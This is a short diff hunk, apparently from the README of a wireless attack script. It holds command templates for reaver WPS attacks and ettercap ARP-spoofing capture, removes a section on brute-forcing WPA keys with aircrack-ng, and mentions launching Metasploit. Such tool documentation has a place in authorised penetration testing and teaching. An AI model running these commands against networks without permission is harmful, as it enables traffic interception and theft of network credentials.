@@ -86,10 +86,6 @@ reaver -i wlan0mon -b $bssidvar -vv -S -P -c $chanvar -d $delvar -o /root/wpslog
 
 ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 
-5. 'AIRCRACK' will brute force the WPA key captured in any PCAPs acquired from a target AP. All four EAPOLs from an AP and client from a single authentication and a very good wordlist will be required for this to work. Command line is as follows:
-
-aircrack-ng -b $bssidvar /root/airodumplog/pcap/$filevar.cap
-
 6. 'Metasploit' will fire up good old msfconsole for you to employ further at your hearts' content
 
 COMMUNICATIONS
